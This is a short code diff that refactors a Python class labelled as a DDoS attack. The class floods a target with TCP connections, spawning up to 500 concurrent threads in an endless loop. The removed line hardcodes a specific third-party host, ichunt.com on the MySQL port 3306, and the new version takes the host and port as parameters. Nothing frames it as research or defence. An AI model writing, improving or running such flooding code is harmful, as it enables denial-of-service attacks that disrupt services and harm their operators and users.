@@ -5,13 +5,17 @@ class DDos:
     """
     ddos攻击
     """
-    def ddos(self, host, port):
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+
+    def __ddos(self):
         sock = socket.socket()
-        sock.connect((host, port))
+        sock.connect((self.host, self.port))
 
     def start(self):
         while 1:
             if active_count() <= 500:
-                Thread(target=self.ddos, args=('ichunt.com', 3306)).start()
+                Thread(target=self.__ddos).start()
             else:
                 time.sleep(2)
